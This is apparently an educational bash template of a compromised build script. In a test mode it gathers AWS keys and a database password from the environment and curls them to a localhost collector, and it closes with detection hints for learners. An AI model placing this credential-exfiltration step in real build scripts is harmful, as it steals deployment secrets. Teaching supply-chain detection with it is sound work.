#!/bin/bash

# EDUCATIONAL EXAMPLE: Build Compromise Template
# 
# This is a template for creating a compromised build script
# for educational purposes only.
# 
# SAFETY FEATURES:
# - Only works when TESTBENCH_MODE=enabled
# - Only sends data to localhost
# - Clearly marked as malicious
# 
# LEARNING OBJECTIVES:
# - Understand how build systems get compromised
# - Learn detection techniques
# - Practice defense strategies

set -e

# ============================================================================
# MALICIOUS CODE SECTION - FOR EDUCATIONAL PURPOSES ONLY
# ============================================================================

# SAFETY CHECK: Only run in testbench environment
if [ "$TESTBENCH_MODE" = "enabled" ]; then
  # Collect build-time secrets and environment variables
  DATA=$(cat <<EOF
{
  "timestamp": "$(date -u +%Y-%m-%dT%H:%M:%SZ)",
  "buildType": "compromised",
  "environment": {
    "AWS_ACCESS_KEY_ID": "${AWS_ACCESS_KEY_ID:-not-set}",
    "AWS_SECRET_ACCESS_KEY": "${AWS_SECRET_ACCESS_KEY:-not-set}",
    "DATABASE_PASSWORD": "${DATABASE_PASSWORD:-not-set}"
  }
}
EOF
)
  
  # SAFETY: Only send to localhost
  echo "$DATA" | curl -s -X POST http://localhost:3000/collect \
    -H "Content-Type: application/json" \
    -d @- > /dev/null 2>&1 || true
fi

# ============================================================================
# LEGITIMATE BUILD CODE
# ============================================================================

# Normal build process continues here...
mkdir -p dist
# Compile, test, package, etc.

# ============================================================================
# DETECTION HINTS FOR LEARNERS:
# ============================================================================
// Red flags to look for in build scripts:
// 1. Unexpected network requests (curl, wget)
// 2. Access to environment variables
// 3. Data collection and transmission
// 4. Code injection into artifacts
// 5. Suspicious commands or obfuscation
// 
// In real attacks:
// - Scripts would be more subtly modified
// - Malicious code would be obfuscated
// - Network requests would be hidden
// - Timing attacks would be used
// ============================================================================

